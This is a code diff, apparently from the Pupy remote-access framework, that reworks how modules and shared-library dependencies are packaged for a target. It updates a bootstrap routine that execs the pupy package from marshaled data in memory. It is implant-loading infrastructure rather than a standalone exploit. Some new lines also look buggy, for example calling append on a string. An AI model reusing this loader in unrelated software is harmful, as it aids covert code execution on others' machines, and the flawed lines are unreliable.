@@ -126,12 +126,6 @@ LIBS_AUTHORIZED_PATHS = [
     'packages'
 ]
 
-PATCHES_PATHS = [
-    os.path.abspath(os.path.join(getcwd(), 'packages', 'patches')),
-    os.path.abspath(os.path.join(ROOT, 'packages', 'patches')),
-    os.path.abspath(os.path.join(ROOT, 'library_patches'))
-]
-
 # ../libs - for windows bundles, to use simple zip command
 # site-packages/win32 - for pywin32
 COMMON_SEARCH_PREFIXES = (
@@ -144,12 +138,14 @@ COMMON_SEARCH_PREFIXES = (
 )
 
 COMMON_MODULE_ENDINGS = (
-    '/', '.py', '.pyo', '.pyc', '.pyd', '.so', '.dll'
+    '/', '.py', '.pyo', '.pyc'
 )
 
 IGNORED_ENDINGS = (
     'tests', 'test', 'SelfTest', 'examples', 'demos', '__pycache__'
 )
+
+# TODO: ADD PY2/PY3 deps
 
 # dependencies to load for each modules
 WELL_KNOWN_DEPS = {
@@ -157,8 +153,8 @@ WELL_KNOWN_DEPS = {
         'windows': ['pupwinutils.security']
     },
     'pupyutils.basic_cmds': {
-        'windows': ['junctions', 'ntfs_streams', '_scandir'],
-        'linux': ['xattr', '_scandir'],
+        'windows': ['junctions', 'ntfs_streams', 'scandir'],
+        'linux': ['xattr', 'scandir'],
         'all': [
             'pupyutils', 'scandir', 'zipfile',
             'tarfile', 'scandir', 'fsutils'
@@ -225,6 +221,25 @@ WELL_KNOWN_DEPS = {
     }
 }
 
+WELL_KNOWN_SHARED_DEPS = {
+    'pythoncom': {
+        'windows': [
+            'pythoncom{pymaj}{pymin}.dll'
+        ]
+    },
+    'pywintypes': {
+        'windows': [
+            'pywintypes{pymaj}{pymin}.dll'
+        ]
+    },
+    'pythoncomloader': {
+        'windows': [
+            'pythoncomloader{pymaj}{pymin}.dll'
+        ]
+    }
+}
+
+
 logger.debug('LIBS_AUTHORIZED_PATHS=%s', LIBS_AUTHORIZED_PATHS)
 
 
@@ -270,24 +285,30 @@ def safe_file_exists(f):
     return os.path.basename(f) in os.listdir(os.path.dirname(f))
 
 
-def bootstrap(stdlib, config, autostart=True):
+def bootstrap(target, stdlib, config, autostart=True):
     actions = [
         'from __future__ import absolute_import',
         'from __future__ import division',
         'from __future__ import print_function',
         'from __future__ import unicode_literals',
 
-        'import imp, sys, marshal',
+        'import {}, sys, marshal'.format(
+            'types' if target.pymaj > 2 else 'imp'
+          ),
 
         'stdlib = marshal.loads({stdlib})',
         'config = marshal.loads({config})',
-        'pupy = imp.new_module("pupy")',
+        'pupy = {}("pupy")'.format(
+            'types.ModuleType' if target.pymaj > 2 else 'imp.new_module'
+        ),
         'pupy.__file__ = str("pupy://pupy/__init__.pyo")',
         'pupy.__package__ = str("pupy")',
         'pupy.__path__ = [str("pupy://pupy/")]',
         'sys.modules[str("pupy")] = pupy',
 
-        'exec(marshal.loads(stdlib["pupy/__init__.pyo"][8:]), pupy.__dict__)',
+        'exec(marshal.loads(stdlib["pupy/__init__.pyo"][{}:]), pupy.__dict__)'.format(
+            (4 * 4) if target.pymaj > 2 else (4 * 2)
+        ),
     ]
 
     if autostart:
@@ -383,12 +404,21 @@ def get_content(target, prefix, filepath, archive=None, honor_ignore=True):
         basepath = basepath + ext
 
         arch_prefixes = ['all']
+        arch_prefixes.append('all_py{}'.format(target.pymaj))
+
         if target.os:
             arch_prefixes.append(target.os)
             arch_prefixes.append(os.path.join(target.os, 'all'))
 
             if target.arch:
                 arch_prefixes.append(os.path.join(target.os, target.arch))
+
+        PATCHES_PATHS = [
+            os.path.abspath(os.path.join(getcwd(), 'packages', 'patches')),
+            os.path.abspath(os.path.join(ROOT, 'packages', 'patches')),
+            os.path.abspath(os.path.join(ROOT, 'library_patches', 'py{}{}'.format(
+                target.pymaj, target.pymin)))
+        ]
 
         for patch_prefix in PATCHES_PATHS:
             if not os.path.isdir(patch_prefix):
@@ -622,20 +652,78 @@ def paths(target):
     ]
 
 
+def dependencies_for_target(target, module_name, rules):
+    if module_name is not None:
+        module_rules = rules.get(module_name, None)
+    else:
+        module_rules = rules
+
+    if module_rules is None:
+        return tuple()
+    elif isinstance(module_rules, dict):
+        pass
+    else:
+        return tuple(module_rules)
+
+    py_suffixes = (':py{}'.format(target.pymaj), '')
+    platforms = [
+        target.os
+    ]
+
+    if target.os != 'windows':
+        platforms.append('posix')
+
+    options = tuple(
+        platform + py_suffix
+        for platform in platforms
+        for py_suffix in py_suffixes
+    )
+
+    all_deps = []
+
+    for py_suffix in py_suffixes:
+        all_deps.extend(module_rules.get('all' + py_suffix, []))
+
+    for option in options:
+        deps = module_rules.get(option, None)
+        if deps is not None:
+            all_deps.extend(deps)
+
+    return tuple(
+        dep.format(
+            pymaj=target.pymaj,
+            pymin=target.pymin,
+            os=target.os
+        ) for dep in all_deps
+    )
+
+
 def _dependencies(target, module_name, dependencies):
-    if module_name in dependencies:
-        return
-
-    if target.pymaj == 2 and target.os == 'windows' and \
-            module_name in ('pythoncom', 'pywintypes', 'pythoncomloader'):
-        dependencies.add(module_name + '27.dll')
-
+    logger.info('Add dep %s', module_name)
     dependencies.add(module_name)
 
-    mod_deps = WELL_KNOWN_DEPS.get(module_name, {})
+    shared_deps = dependencies_for_target(
+        target, module_name, WELL_KNOWN_SHARED_DEPS
+    )
 
-    for dependency in mod_deps.get('all', []) + mod_deps.get(target.os, []):
-        _dependencies(target, dependency, dependencies)
+    if shared_deps:
+        logger.info('Add shared deps for %s: %s', module_name, shared_deps)
+        dependencies.update(shared_deps)
+
+    py_deps = dependencies_for_target(
+        target, module_name, WELL_KNOWN_DEPS
+    )
+
+    if not py_deps:
+        return
+
+    logger.info('Add deps for %s: %s', module_name, py_deps)
+    dependencies.update(py_deps)
+
+    for dep in py_deps:
+        _dependencies(target, dep, dependencies)
+
+    logger.info('Add deps for %s: %s (child deps) - complete', module_name, py_deps)
 
 
 def _package(
@@ -660,7 +748,30 @@ def _package(
         if archive:
             modules_dic = {}
 
-            endings = COMMON_MODULE_ENDINGS
+            endings = list(COMMON_MODULE_ENDINGS)
+
+            try:
+                extension_suffix = [
+                    x.strip() for x in archive.open(
+                        'extension-suffix'
+                    ).read().decode('ascii').split('\n')
+                ]
+
+                endings.extend([
+                    ( '.' + ext if not ext.startswith('.') else '' )
+                    for ext in extension_suffix
+                ])
+
+            except (KeyError, StopIteration):
+                # No extension-suffix, okay..
+                if target.os == 'windows':
+                    extension_suffix = '.pyd'
+                else:  # Well, better than nothing
+                    extension_suffix = '.so'
+
+            # Special case for windows
+            if target.os == 'windows':
+                extension_suffix.append('.dll')
 
             start_paths = tuple([
                 (
@@ -672,28 +783,57 @@ def _package(
 
             for info in archive.infolist():
                 content = None
-                if info.filename.startswith(start_paths):
-                    module_name = info.filename
+                if not info.filename.startswith(start_paths):
+                    if initial_module_name in info.filename:
+                        logger.info('%s: omit %s', initial_module_name, info.filename)
+                    continue
 
-                    for prefix in COMMON_SEARCH_PREFIXES:
-                        if module_name.startswith(prefix + '/'):
-                            module_name = module_name[len(prefix)+1:]
-                            break
+                logger.info('%s: try %s', initial_module_name, info.filename)
 
-                    try:
-                        base, ext = module_name.rsplit('.', 1)
-                    except:
+                module_name = info.filename
+
+                for prefix in COMMON_SEARCH_PREFIXES:
+                    if module_name.startswith(prefix + '/'):
+                        module_name = module_name[len(prefix)+1:]
+                        break
+
+                module_name_ending = None
+
+                for ending in endings:
+                    if '.' not in ending:
+                        logger.info(
+                            '%s: omit %s: invalid ending: %s',
+                            initial_module_name, info.filename, ending
+                        )
                         continue
 
-                    # Garbage removing
-                    if ext == 'py':
+                    if module_name.endswith(ending):
+                        if not module_name_ending or \
+                          len(ending) > len(module_name_ending):
+                            module_name_ending = ending
+
+                if not module_name_ending:
+                    logger.info(
+                        '%s: omit %s: no valid ending found in %s',
+                        initial_module_name, info.filename, endings
+                    )
+                    continue
+
+                base = module_name[:-len(module_name_ending)]
+                ext = module_name_ending.rsplit('.', 1)[-1]
+
+                # Garbage removing
+                if ext == 'py':
+                    try:
+                        content = get_content(
+                            target, prefix,
+                            info.filename, archive,
+                            honor_ignore=honor_ignore
+                        )
+
                         try:
                             content = pupycompile(
-                                get_content(
-                                    target, prefix,
-                                    info.filename, archive,
-                                    honor_ignore=honor_ignore
-                                ),
+                                content,
                                 info.filename,
                                 target=target.pyver
                             )
@@ -706,47 +846,65 @@ def _package(
                             if base+'.pyc' in modules_dic:
                                 del modules_dic[base+'.pyc']
 
-                        except IgnoreFileException:
-                            continue
-
-                    elif ext == 'pyc':
-                        if base+'.py' in modules_dic:
-                            del modules_dic[base+'.py']
-
-                        if base+'.pyo' in modules_dic:
-                            continue
-                    elif ext == 'pyo':
-                        if base+'.py' in modules_dic:
-                            del modules_dic[base+'.py']
-
-                        if base+'.pyc' in modules_dic:
-                            del modules_dic[base+'.pyc']
-
-                        if base+'.pyo' in modules_dic:
-                            continue
-                    # Special case with pyd loaders
-                    elif ext == 'pyd':
-                        if base+'.py' in modules_dic:
-                            del modules_dic[base+'.py']
-
-                        if base+'.pyc' in modules_dic:
-                            del modules_dic[base+'.pyc']
-
-                        if base+'.pyo' in modules_dic:
-                            del modules_dic[base+'.pyo']
-
-                    if not content:
-                        try:
-                            content = get_content(
-                                target, prefix,
-                                info.filename, archive,
-                                honor_ignore=honor_ignore
+                        except ValueError as e:
+                            logger.error(
+                                'Failed to compile %s: %s',
+                                info.filename, e
                             )
-                        except IgnoreFileException:
-                            continue
 
-                    if content:
-                        modules_dic[base+'.'+ext] = content
+                    except IgnoreFileException:
+                        logger.info(
+                            'Failed to get content for %s: IgnoreFileException',
+                            info.filename
+                        )
+                        continue
+
+                elif ext == 'pyc':
+                    if base+'.py' in modules_dic:
+                        del modules_dic[base+'.py']
+
+                    if base+'.pyo' in modules_dic:
+                        continue
+                elif ext == 'pyo':
+                    if base+'.py' in modules_dic:
+                        del modules_dic[base+'.py']
+
+                    if base+'.pyc' in modules_dic:
+                        del modules_dic[base+'.pyc']
+
+                    if base+'.pyo' in modules_dic:
+                        continue
+                # Special case with pyd loaders
+                elif ext == 'pyd':
+                    if base+'.py' in modules_dic:
+                        del modules_dic[base+'.py']
+
+                    if base+'.pyc' in modules_dic:
+                        del modules_dic[base+'.pyc']
+
+                    if base+'.pyo' in modules_dic:
+                        del modules_dic[base+'.pyo']
+
+                if not content:
+                    try:
+                        content = get_content(
+                            target, prefix,
+                            info.filename, archive,
+                            honor_ignore=honor_ignore
+                        )
+                    except IgnoreFileException:
+                        logger.info(
+                            'Failed to get content for %s: IgnoreFileException',
+                            info.filename
+                        )
+                        continue
+
+                if content:
+                    logger.info(
+                        '%s: loaded from %s',
+                        initial_module_name, info.filename
+                    )
+                    modules_dic[base+'.'+ext] = content
 
             archive.close()
 
@@ -777,7 +935,7 @@ def _package(
                 logger.error(e)
 
     if not modules_dic:
-        raise NotFoundError(module_name)
+        raise NotFoundError(initial_module_name)
 
     modules.update(modules_dic)
 
